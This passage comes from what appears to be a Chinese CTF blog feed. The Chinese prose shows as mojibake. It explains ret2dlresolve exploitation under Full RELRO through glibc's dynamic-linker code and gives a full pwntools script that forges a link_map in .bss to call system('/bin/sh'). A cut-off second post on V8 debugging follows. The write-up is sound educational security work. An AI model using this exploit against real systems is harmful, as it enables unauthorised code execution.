class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *verstab </span>= <span class="built_in">map</span>-&gt;l_versyms;</span><br><span class="line">  <span class="keyword">if</span> (version != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (verstab == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">  assert (version-&gt;filename == <span class="literal">NULL</span></span><br><span class="line">  || ! _dl_name_match_p (version-&gt;filename, <span class="built_in">map</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Otherwise we accept the symbol.  */</span></span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* We can match the version information or use the</span></span><br><span class="line"><span class="comment">     default one if it is not hidden.  */</span></span><br><span class="line">  ElfW(Half) ndx = verstab[symidx] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  <span class="keyword">if</span> ((<span class="built_in">map</span>-&gt;l_versions[ndx].hash != version-&gt;hash</span><br><span class="line">       || <span class="built_in">strcmp</span> (<span class="built_in">map</span>-&gt;l_versions[ndx].name, version-&gt;name))</span><br><span class="line">      &amp;&amp; (version-&gt;hidden || <span class="built_in">map</span>-&gt;l_versions[ndx].hash</span><br><span class="line">  || (verstab[symidx] &amp; <span class="number">0x8000</span>)))</span><br><span class="line">    <span class="comment">/* It&#x27;s not the version we want.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (verstab != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((verstab[symidx] &amp; <span class="number">0x7fff</span>)</span><br><span class="line">      &gt;= ((flags &amp; DL_LOOKUP_RETURN_NEWEST) ? <span class="number">2</span> : <span class="number">3</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Don&#x27;t accept hidden symbols.  */</span></span><br><span class="line">      <span class="keyword">if</span> ((verstab[symidx] &amp; <span class="number">0x8000</span>) == <span class="number">0</span></span><br><span class="line">  &amp;&amp; (*num_versions)++ == <span class="number">0</span>)</span><br><span class="line"><span class="comment">/* No version so far.  */</span></span><br><span class="line">*versioned_sym = sym;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There cannot be another entry for this symbol so stop here.  */</span></span><br><span class="line">  <span class="keyword">return</span> sym;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨<code>check_match</code>å‡½æ•°ä¸­é€šè¿‡è¿™æ¡<code>if (version != NULL)</code>è¯­å¥åˆåˆ†ä¸ºäº†ä¸¤æ¡åˆ†æ”¯ï¼Œè‚‰çœ¼å¯è§çš„æ˜¯ä¸Šé¢çš„åˆ†æ”¯æ˜¯è¾ƒä¸ºä¸¥æ ¼çš„ä¸€æ¡ï¼Œè€Œä¸‹é¢çš„åˆ™æ˜¯è¾ƒä¸ºç®€å•çš„ä¸€æ¡ã€‚ä¸è¿‡æ˜¾è€Œæ˜“è§çš„æ˜¯è¿™æ¡åˆ†æ”¯çš„èµ°å‘æ˜¯ç”±<code>version</code>å˜é‡å†³å®šçš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ<code>version</code>çš„ç”±æ¥å°±æ˜¯ä¸Šé¢çš„è¿™æ®µä»£ç èµ‹äºˆçš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…å¯ä»¥æ§åˆ¶<code>ndx</code>éƒ½æ˜¯å¯ä»¥è§£å†³çš„ã€‚</p><p>é¦–å…ˆæ€è€ƒç¬¬äºŒç§æ–¹å¼ï¼Œé¦–å…ˆåˆ™æ˜¯å¯ä»¥çœ‹åˆ°è¿™é‡Œ<code>ndx</code>ä¸­çš„è®¡ç®—æ–¹å¼<code>ELFW(R_SYM) (reloc-&gt;r_info)</code>å’Œå‰é¢è·å–<code>sym</code>æ—¶æ˜¯åŒä¸€ç§è¿ç®—æ–¹å¼ã€‚æ‰€ä»¥è¿™ä¸€ç®—å¼ä¸­çš„å„ä¸ªå‚æ•°æˆ‘ä»¬æ˜¯ä¼˜å…ˆä¿è¯symçš„æ­£ç¡®æ€§çš„ã€‚ä¸è¿‡<code>DT_SYMTAB</code>æ‰€å¤„çš„æ®µå’Œ<code>DT_VERSYM</code>æ‰€å¤„çš„æ®µæ˜¯ä¸ä¸€æ ·çš„ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹è¿™é‡Œçš„ä¾æ®ä¹‹ä¸€ï¼Œå¦ä¸€ä¸ªä¾æ®åˆ™æ˜¯<code>&amp;l-&gt;l_versions[0]</code>çš„å†…å®¹æ˜¯NULLã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©ä»–ä¸ºNULLå³å¯ã€‚</p><p><code>DT_VERSYM</code>èŠ‚çš„ä½ç½®å…¶å®å°±æ˜¯<code>.gnu.version</code>èŠ‚çš„ä½ç½®ï¼Œæ‰€ä»¥é¦–å…ˆé€šè¿‡<code>readelf</code>æŸ¥çœ‹ä¸€ä¸‹èŠ‚çš„ä½ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Version symbols section <span class="string">&#x27;.gnu.version&#x27;</span> contains 7 entries:</span><br><span class="line">Addr: 0x00000000004003dc  Offset: 0x0003dc  Link: 5 (.dynsym)</span><br><span class="line">000:   0 (*<span class="built_in">local</span>*)       0 (*<span class="built_in">local</span>*)       2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)</span><br><span class="line">004:   3 (GLIBC_2.7)     2 (GLIBC_2.2.5)   2 (GLIBC_2.2.5)</span><br></pre></td></tr></table></figure><p>éšåçœ‹ä¸€ä¸‹ç¨‹åºåœ¨è¿è¡Œæ—¶çš„å†…å­˜å¸ƒå±€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">        0x400000           0x401000 r-xp     1000 0      /ctf/work/download/todo/ezzzz</span><br><span class="line">        0x600000           0x601000 r--p     1000 0      /ctf/work/download/todo/ezzzz</span><br><span class="line">        0x601000           0x602000 rw-p     1000 1000   /ctf/work/download/todo/ezzzz</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>DT_VERSYM</code>æ‰€å¤„çš„ä½ç½®å°±æ˜¯ç¬¬ä¸€é¡µä¸­ã€‚</p><p>è€Œåœ¨linuxå­˜åœ¨è¿™æ ·ä¸€ç§åˆ†é¡µæœºåˆ¶ï¼Œå¦‚æœå½“å‰é¡µçš„ä½¿ç”¨ä¸åˆ°<code>0x1000</code>å…¶å®ä¹Ÿä¼šè¿”å›ä¸€é¡µï¼Œæ‰€ä»¥åœ¨æ²¡æœ‰ä½¿ç”¨å®Œçš„æƒ…å†µä¸‹ï¼Œé¡µå†…å¯èƒ½å­˜åœ¨ç©ºç™½æ•°æ®ä¹Ÿå°±æ˜¯<code>\x00</code>ã€‚è€Œè¿™ä¸ªæ®µçš„ç»“æŸä½ç½®åˆ™åœ¨<code>.eh_frame</code>å¯ä»¥çœ‹åˆ°åœ°å€ä¸º<code>0000000000400860</code>ï¼Œé‚£ä¹ˆå½“è¿™ä¸ªç»“æŸåœ°å€å‡å»<code>.gnu.version</code>çš„åœ°å€åˆ™è¡¨ç¤ºæ‰€å–çš„<code>ndx</code>çš„åç§»åˆ°<code>0x400860 ~ 0x401000</code>ä¹‹é—´åˆ°æœ€å°å€¼ã€‚</p><p>åœ¨x64å’Œx32ä¸Š<code>ElfW(Half)</code>çš„ç»“æ„éƒ½æ˜¯2ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥ä¸Šè¿°çš„æœ€å°åç§»æ˜¯ï¼š<code>(0x400860-0x4003dc) / sizeof(ElfW(Half)) = 0x242</code></p><p>è€Œæˆ‘ä»¬éœ€è¦æŠŠä¼ªé€ çš„å†…å®¹æ”¾åˆ°bssæ®µä¸Šï¼Œéšåè®¡ç®—æœ€å¤§åç§»åˆ™æ˜¯æ ¹æ®symçš„è·å–è¿›è¡Œè®¡ç®—<code>(0x602000-0x601000) /sizeof (Elf64_Sym) = 0xaa</code>ã€‚æœ€ç»ˆå¾—åˆ°<code>0xaa &lt; 0x242</code>æ‰€ä»¥ä¹Ÿå°±å¯¼è‡´æ— æ³•åœ¨æ»¡è¶³ndxçš„åŒæ—¶æ‹¿åˆ°ä¼ªé€ çš„symç»“æ„ã€‚**(ä¸è¿‡32ä½æ˜¯å¯ä»¥çš„ï¼Œåªéœ€è¦åœ¨bssé åçš„ä½ç½®å†™symç»“æ„ä½“å³å¯)**ã€‚</p><p>é‚£ä¹ˆæ¥ç€æ€è€ƒç¬¬ä¸€ç§æ–¹å¼ï¼Œåœ¨åªæœ‰æ ˆæº¢å‡ºçš„æƒ…å†µä¸‹æˆ‘ä»¬æ— æ³•ç›´æ¥æ³„æ¼æˆ–ä¿®æ”¹<code>link_map</code>ç»“æ„ä½“ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆå”¯ä¸€å¯è¡Œçš„æ–¹æ³•å°±æ˜¯è¿›è¡Œæ ˆè¿ç§»åœ¨bssä¸­ä¼ªé€ <code>link_map</code>ï¼Œä½†æ˜¯å¦‚æœæ˜¯èµ°ç¬¬ä¸€ä¸ªåˆ†æ”¯å°±ä¼šå‡ºç°ä¸€ç§æƒ…å†µäº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lookup_t</span></span><br><span class="line">_dl_lookup_symbol_x (<span class="keyword">const</span> <span class="keyword">char</span> *undef_name, struct link_map *undef_map,</span><br><span class="line">     <span class="keyword">const</span> ElfW(Sym) **ref,</span><br><span class="line">     struct r_scope_elem *symbol_scope[],</span><br><span class="line">     <span class="keyword">const</span> struct r_found_version *version,</span><br><span class="line">     <span class="keyword">int</span> type_class, <span class="keyword">int</span> flags, struct link_map *skip_map)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> new_hash = _dl_new_hash (undef_name);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> old_hash = <span class="number">0xffffffff</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sym_val</span> <span class="title">current_value</span> =</span> &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">scope</span> =</span> symbol_scope;</span><br><span class="line"></span><br><span class="line">  bump_num_relocations ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* DL_LOOKUP_RETURN_NEWEST does not make sense for versioned</span></span><br><span class="line"><span class="comment">     lookups.  */</span></span><br><span class="line">  assert (version == <span class="literal">NULL</span> || !(flags &amp; DL_LOOKUP_RETURN_NEWEST));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (skip_map != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="comment">/* Search the relevant loaded objects for a definition.  */</span></span><br><span class="line">    <span class="keyword">while</span> ((*scope)-&gt;r_list[i] != skip_map)</span><br><span class="line">      ++i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Search the relevant loaded objects for a definition.  */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> start = i; *scope != <span class="literal">NULL</span>; start = <span class="number">0</span>, ++scope)</span><br><span class="line">    <span class="keyword">if</span> (do_lookup_x (undef_name, new_hash, &amp;old_hash, *ref,</span><br><span class="line">     &amp;current_value, *scope, start, version, flags,</span><br><span class="line">     skip_map, type_class, undef_map) != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>_dl_lookup_symbol_x</code>å‡½æ•°ä¸­æœç´¢çš„æ–¹æ³•æ˜¯æ ¹æ®<code>scope</code>è¿™ä¸ªèŒƒå›´æœç´¢çš„ï¼Œè€Œè¿™ä¸ªèŒƒå›´æ˜¯é€šè¿‡<code>l-&gt;l_scope</code>è·å–çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬åœ¨æ²¡æœ‰ä»»ä½•åœ°å€æ³„æ¼çš„æƒ…å†µä¸‹è¦æƒ³ä¼ªé€ <code>l_scope</code>æ˜¯ä¸ç°å®çš„ã€‚é‚£ä¹ˆå”¯ä¸€çš„æ–¹æ³•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>å½“ç„¶æ˜¯èµ°elseè¯­å¥äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥è¿”å›çš„æ˜¯<code>link_map-&gt;l_addr + sym-&gt;d_val</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005c3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004005c1</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_load_plt = <span class="number">0x4003f6</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line">l_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(pop_rsi_r15)+p64(bss+<span class="number">0x100</span>)+p64(<span class="number">0</span>) + \</span><br><span class="line">    p64(read_plt)+p64(elf.symbols[<span class="string">&#x27;fun&#x27;</span>])</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">dynstr_addr = <span class="number">0x400318</span> <span class="comment"># str table</span></span><br><span class="line">fake_link_map_addr = bss+<span class="number">0x100</span></span><br><span class="line">r_offset = fake_link_map_addr + l_addr * -<span class="number">1</span> - <span class="number">8</span></span><br><span class="line">l_addr = l_addr &amp; (<span class="number">2</span>**<span class="number">64</span>-<span class="number">1</span>)</span><br><span class="line">fake_strtab = p64(<span class="number">0</span>)+p64(dynstr_addr)</span><br><span class="line">fake_strtab_addr = fake_link_map_addr+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">fake_symtab = p64(<span class="number">0</span>)+p64(read_got-<span class="number">0x8</span>)</span><br><span class="line">fake_symtab_addr = fake_link_map_addr+<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">fake_dynrel_addr = fake_link_map_addr+<span class="number">0x28</span></span><br><span class="line">fake_rel_addr = fake_link_map_addr+<span class="number">0x38</span></span><br><span class="line">fake_dynrel = p64(<span class="number">0</span>)+p64(fake_rel_addr)</span><br><span class="line">fake_rel = p64(r_offset)+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_link_map = p64(l_addr)+fake_strtab+fake_symtab+fake_dynrel+fake_rel</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_link_map += p64(fake_strtab_addr)+p64(fake_symtab_addr)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(fake_dynrel_addr)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">r.sendline(fake_link_map)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = fake_link_map_addr+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>)+p64(pop_rdi) + \</span><br><span class="line">    p64(bin_sh_addr)+p64(read_load_plt) + \</span><br><span class="line">    p64(fake_link_map_addr)+p64(<span class="number">0</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†æ¬¡å®¡è§†è¿™æ®µexpï¼Œå¯ä»¥å‘ç°<code>l_addr</code>å…¶å®å°±æ˜¯<code>read</code>å‡½æ•°å’Œ<code>system</code>å‡½æ•°ä¹‹é—´çš„å·®å€¼ï¼Œè€Œ<code>sym-&gt;d_val</code>å°±æ˜¯<code>read</code>å‡½æ•°çš„åœ°å€ï¼Œå¹¶ä¸”å¯ä»¥å°†è¿™ç¯‡æ–‡ç« çš„ä»£ç è¿›è¡Œç¼–è¯‘ä¼šå‘ç°ä»–çš„gotè¡¨ä¸­<code>read</code>å‡½æ•°ä¸æ˜¯é¦–ä½ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯<code>_libc_start_main</code>è¿™ä¹Ÿåˆšå¥½å¯ä»¥è®©<code>sym-&gt;st_other</code>ä¸ä¸º0ä»è€Œè¿›å…¥elseã€‚</p><h3 id="ä¸Fullçš„å·®åˆ«"><a href="#ä¸Fullçš„å·®åˆ«" class="headerlink" title="ä¸Fullçš„å·®åˆ«"></a>ä¸Fullçš„å·®åˆ«</h3><p>å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥ï¼Œè¿™é“é¢˜ç›®æ‰€åˆ©ç”¨çš„æ–¹å¼å…¶å®æ˜¯èµ°çš„ifåˆ†æ”¯è€Œä¸æ˜¯elseï¼Œå› ä¸ºè¿™é“é¢˜å‹æ ¹æ²¡ç»™libcæ‰€ä»¥æ— æ³•è®¡ç®—åç§»ã€‚è™½ç„¶æˆ‘åœ¨æ„é€ symç»“æ„ä½“çš„æ—¶å€™é€‰æ‹©äº†<code>read@got - 8</code>çš„ä½ç½®ï¼Œä½†æ˜¯å±äºæ˜¯ççŒ«ç¢°åˆ°æ­»è€—å­è¿™ä¸ªé¢˜ç›®ä¸­çš„<code>read</code>å°±æ˜¯gotè¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥æ‰æ²¡æœ‰å¯¼è‡´<code>sym-&gt;st_other</code>ä¸ºé0ã€‚</p><p>å¯èƒ½å¤§å®¶ä¼šç–‘æƒ‘ä¸ºä»€ä¹ˆè¿™é‡Œèƒ½å¤Ÿèµ°ä¸Šé¢çš„ifè¯­å¥ï¼Œåˆæ˜¯å› ä¸ºè¿æ°”å¥½ï¼ˆå¯èƒ½æ˜¯åšé¢˜è¿æ°”ç”¨å®Œäº†ï¼Œå›½èµ›å•¥éƒ½æ²¡æŠ½åˆ°ğŸ˜­ï¼‰ï¼Œåœ¨è¿›è¡Œæ—¶ndxåˆæ˜¯ä¸º0ã€‚å½“ç„¶å¦‚æœä¸ä¸º0æˆ‘ä»¬å¯ä»¥é‡‡å–ä¸Šé¢çš„ç¬¬äºŒç§åŠæ³•ï¼Œç›´æ¥è¦†ç›–<code>0x1d0</code>ä¸º0å³å¯ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230728222143061.png"                      alt="image-20230728222143061"                ></p><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://inaz2.hatenablog.com/entry/2014/07/29/020112" >https://inaz2.hatenablog.com/entry/2014/07/29/020112<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/glibc/latest/source/elf/dl-runtime.c#L41" >https://elixir.bootlin.com/glibc/latest/source/elf/dl-runtime.c#L41<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åœ¨å…ˆå‰å…¶å®æˆ‘å·²ç»å†™è¿‡ä¸€ç¯‡&lt;a class=&quot;link&quot;   href=&quot;https://cv196082.gitee.io/2022/02/</summary>
      
    
    
    
    <category term="pwn" scheme="https://196082.github.io/categories/pwn/"/>
    
    
    <category term="dl-runtime-resolve" scheme="https://196082.github.io/tags/dl-runtime-resolve/"/>
    
    <category term="Full RELRO" scheme="https://196082.github.io/tags/Full-RELRO/"/>
    
  </entry>
  
  <entry>
    <title>v8åˆä½“éªŒ</title>
    <link href="https://196082.github.io/2023/06/27/v8%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>https://196082.github.io/2023/06/27/v8%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2023-06-27T12:05:06.000Z</published>
    <updated>2023-06-27T12:05:13.396Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ®µäº‹æƒ…å› ä¸ºå„ç§äº‹æƒ…è€½æï¼Œä¸€ç›´æ²¡æœ‰æ›´æ–°æ–‡ç« ã€‚æœ¬æ‰“ç®—æ–°çš„ä¸€ç¯‡å‡º<code>rootkit</code>æ¥æ°´ä¸€ç¯‡ï¼Œåé¢å‘ç°a3ä½¬å†™çš„å¤ªå¤šäº†ï¼Œä¸æƒ³ç»§ç»­çœ‹äº†ã€‚ç„¶åå‰é˜µå­ä¸€ç›´åœ¨æ€è€ƒåç»­åˆ°åº•æ˜¯å­¦ä»€ä¹ˆæ–¹å‘ï¼Œåœ¨dockeré€ƒé€¸ã€chromeå†…æ ¸ã€iotè¿˜æœ‰fuzzä¹‹é—´çŠ¹è±«ä¸å†³ï¼Œç°åœ¨ä¹Ÿç®—æ˜¯ä¸‹å®šå†³å¿ƒæ¥å­¦å­¦chromeäº†ï¼Œåªå¸Œæœ›èƒ½å¤Ÿå¿«ç‚¹æå®Œï¼Œåé¢è¿˜æ˜¯æ‰“ç®—æ›´å¤šçš„å»å­¦ä¹ dockeré€ƒé€¸ã€‚</p><p>è¿™é‡Œå°±ä¸æç¯å¢ƒå®‰è£…çš„äº‹æƒ…äº†ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šç›¸å…³èµ„æ–™ã€‚</p><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>jsä½œä¸ºä¸€ä¸ªé¢å‘å¯¹è±¡ç¼–ç¨‹çš„è¯­è¨€ï¼Œä»–çš„å˜é‡éƒ½æ˜¯ä»¥ç±»çš„å½¢å¼è¡¨ç°çš„ã€‚å¹¶ä¸”jsä½œä¸ºåŠ¨æ€è¯­è¨€ï¼Œä»–çš„ç±»æˆå‘˜æ˜¯å¯ä»¥æ”¹å˜çš„ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´ä»–åœ¨å†…å­˜ä¸­çš„å­˜åœ¨å½¢å¼ç›¸äº¤ä¸Cè¯­è¨€è¦å¤æ‚çš„å¤šã€‚</p><p>ä½¿ç”¨å¦‚ä¸‹ç¨‹åºè¿›è¡Œè°ƒè¯•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> int_arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span> : <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> object_arr = [obj, obj, obj];</span><br><span class="line"><span class="keyword">var</span> newed_arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">%DebugPrint(int_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(float_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(object_arr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">%DebugPrint(newed_arr);</span><br><span 